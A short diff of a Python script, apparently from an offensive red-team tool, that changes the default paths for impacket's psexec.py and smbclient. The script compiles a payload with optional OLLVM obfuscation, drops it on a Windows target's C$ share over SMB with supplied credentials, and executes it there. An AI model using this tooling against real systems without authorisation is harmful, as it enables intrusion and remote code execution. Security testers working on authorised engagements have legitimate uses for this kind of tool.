@@ -13,7 +13,7 @@ parser.add_argument('--mem2',default=False,action='store_true',help='add a file 
 parser.add_argument('--mem3',default=False,action='store_true',help='add a file in MEMORY_3 at compilation time, file should be located here: ~/.malleable/config/mem3')
 parser.add_argument('--mem4',default=False,action='store_true',help='add a file in MEMORY_4 at compilation time, file should be located here: ~/.malleable/config/mem4')
 parser.add_argument('-exec_target',default='',help='[[domain/]username[:password]@]<targetName or address>, by default use the content of ~/.exec')
-parser.add_argument('-exec_method',default='/usr/share/doc/python3-impacket/examples/psexec.py',help='Method to execute on the Windows side, default psexec.py')
+parser.add_argument('-exec_method',default='psexec.py',help='Method to execute on the Windows side, default psexec.py')
 parser.add_argument('--no_exec',default=False,action='store_true',help='Compile only and drop with smb to the target but dont execute')
 #parser.add_argument('--no_drop',default=False,action='store_true',help='Compile only, dont drop to the target,dont execute')
 parser.add_argument('--ollvm',default=False,action='store_true',help='OLLVM obfuscation, add the release flag automatically')
@@ -100,7 +100,7 @@ def main():
         else:
             log.info(f'[+] upload file via SMB into target')
         upload_comm=f'''
-/usr/bin/impacket-smbclient "{exec_target}" <<EOF
+smbclient.py "{exec_target}" <<EOF
 use C$
 put {file_target}
 ls {filename_target}
